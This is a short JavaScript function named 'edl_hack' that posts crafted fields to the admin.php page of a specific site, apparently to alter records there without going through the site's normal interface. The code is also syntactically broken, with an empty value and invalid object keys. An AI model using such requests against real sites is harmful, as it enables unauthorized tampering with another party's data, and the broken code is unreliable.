function edl_hack() {
	$.post("http://q2scene.net/edl/admin.php", {
		idc[1]: 4900, 
		idg[1]: 0, 
		idt[1]:,
		name[1]: 'claire'
		}, 
		
		function(result) {
			var r = JSON.parse(result);
			if (r.value == 1) {
				toastr.success(r.message);
			} else {
				toastr.error(r.message);
			}
	});
}